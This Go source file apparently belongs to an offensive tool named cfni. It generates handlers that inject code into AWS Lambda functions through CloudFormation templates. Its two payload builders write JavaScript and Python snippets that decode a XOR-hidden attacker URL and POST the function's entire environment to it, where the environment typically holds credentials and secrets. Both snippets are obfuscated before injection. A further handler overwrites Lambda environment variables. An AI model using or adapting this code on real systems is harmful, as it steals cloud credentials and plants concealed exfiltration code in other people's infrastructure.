package cfni

import (
	"fmt"

	"github.com/hupe1980/cfni/pkg/obfuscator/js"
	"github.com/hupe1980/cfni/pkg/obfuscator/python"
)

type CreateLambdaExfiltrationOptions struct {
	URL         string
	XORKey      string
	S3AccessKey *S3AccessKey
	*Filter
}

func (c *CFNI) CreateLambdaExfiltrationHandler(opts *CreateLambdaExfiltrationOptions) ([]byte, error) {
	nodeJSCodeInjection, err := createNodeJSCodeInjection(opts.URL, opts.XORKey)
	if err != nil {
		return nil, err
	}

	pythonCodeInjection, err := createPythonCodeInjection(opts.URL, opts.XORKey)
	if err != nil {
		return nil, err
	}

	return c.createHandler(&HandlerOptions{
		CFNITemplate: "templates/lambda_exfiltration.py",
		CFNIData: &struct {
			NodeJSCodeInjection string
			PythonCodeInjection string
		}{
			NodeJSCodeInjection: nodeJSCodeInjection,
			PythonCodeInjection: pythonCodeInjection,
		},
		S3Client: s3Client(opts.S3AccessKey),
		Filter:   opts.Filter,
	})
}

func createNodeJSCodeInjection(url, xorKey string) (string, error) {
	payload := fmt.Sprintf(`(function() {
var https = require("https")
var text = Buffer.from("%s", "hex").toString("utf8");
var key = "%s";
var url = "";
for (var i = 0; i < text.length; i++) { url += String.fromCharCode(text.charCodeAt(i) ^ key.charCodeAt(i %% key.length)) };
var postData = JSON.stringify(process.env);
var options = { method: 'POST', headers: { "Content-Type": "application/json", "Content-Length": postData.length } };
var req = https.request(url, options);
req.write(postData);
req.end();
})();`, hexify(xor(url, xorKey)), xorKey)

	obfuscator := js.New()

	return obfuscator.Obfuscate(payload)
}

func createPythonCodeInjection(url, xorKey string) (string, error) {
	payload := fmt.Sprintf(`import urllib.request
import json
import os
(lambda x: urllib.request.urlopen(urllib.request.Request("".join([chr(ord(x[i]) ^ ord("%s"[i%%len("%s")])) for i in range(len(x))]),data=json.dumps(dict(os.environ)).encode('utf8'),headers={"Content-Type": "application/json"},method="POST")))(bytes.fromhex("%s").decode('utf-8'))`, xorKey, xorKey, hexify(xor(url, xorKey)))

	obfuscator := python.New()

	return obfuscator.Obfuscate(payload)
}

type CreateLambdaSetEnvsOptions struct {
	Envs        map[string]string
	S3AccessKey *S3AccessKey
	*Filter
}

func (c *CFNI) CreateLambdaSetEnvsHandler(opts *CreateLambdaSetEnvsOptions) ([]byte, error) {
	return c.createHandler(&HandlerOptions{
		CFNITemplate: "templates/lambda_set_envs.py",
		CFNIData: &struct {
			Envs string
		}{
			Envs: toPythonDict(opts.Envs),
		},
		S3Client: s3Client(opts.S3AccessKey),
		Filter:   opts.Filter,
	})
}
